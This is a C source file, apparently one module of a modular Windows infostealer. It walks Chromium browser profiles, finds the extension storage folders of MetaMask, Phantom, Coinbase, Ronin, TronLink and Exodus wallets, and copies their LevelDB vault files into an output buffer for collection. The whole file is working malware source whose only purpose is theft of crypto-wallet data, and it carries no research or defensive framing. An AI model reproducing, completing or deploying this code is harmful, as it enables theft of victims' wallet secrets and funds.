// chunk: collectors/crypto_wallets
// depends: core/emit_buffer, core/file_ops, collectors/browser_chromium
// provides: collect_crypto_wallets
// headers: shlobj.h

#ifndef CHUNK_CRYPTO_WALLETS
#define CHUNK_CRYPTO_WALLETS

#include <shlobj.h>

static void collect_crypto_wallets(void) {
    char local[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, local) != S_OK) return;

    struct { const char *name; const char *ext_id; } wallets[] = {
        {"MetaMask",     "nkbihfbeogaeaoehlefnkodbefgpgknn"},
        {"Phantom",      "bfnaelmomeimhlpmgjnjophhpkkoljpa"},
        {"Coinbase",     "hnfanknocfeofbddgcijnmhnfnkdnaad"},
        {"Ronin",        "fnjhmkhhmkbjkkabndcnnogagogbneec"},
        {"TronLink",     "ibnejdfjmmkpcnlpebklmnkoeoihofec"},
        {"Exodus",       "aholpfdialjgjfhomihkjbmgjidlcdno"},
    };

    int found = 0;
    for (int b = 0; b < (int)N_BROWSERS; b++) {
        char ext_base[MAX_PATH];
        snprintf(ext_base, MAX_PATH, "%s\\%s\\Default\\Local Extension Settings",
                 local, CHROMIUM_BROWSERS[b].subpath);
        if (!file_exists(ext_base)) continue;

        for (int w = 0; w < (int)(sizeof(wallets)/sizeof(wallets[0])); w++) {
            char wdir[MAX_PATH];
            snprintf(wdir, MAX_PATH, "%s\\%s", ext_base, wallets[w].ext_id);
            if (!file_exists(wdir)) continue;

            if (!found) emitf("=== CRYPTO WALLETS ===\r\n");
            found = 1;
            emitf("[%s in %s]\r\n", wallets[w].name, CHROMIUM_BROWSERS[b].name);

            char wpat[MAX_PATH];
            snprintf(wpat, MAX_PATH, "%s\\*.ldb", wdir);
            WIN32_FIND_DATAA fd;
            HANDLE hf = FindFirstFileA(wpat, &fd);
            if (hf != INVALID_HANDLE_VALUE) {
                do {
                    char fp[MAX_PATH];
                    snprintf(fp, MAX_PATH, "%s\\%s", wdir, fd.cFileName);
                    emitf("  %s (%lu bytes)\r\n", fd.cFileName, fd.nFileSizeLow);
                    emit_file(fp, 2*1024*1024);
                } while (FindNextFileA(hf, &fd));
                FindClose(hf);
            }
        }
    }
    if (found) emitf("\r\n");
}

#endif
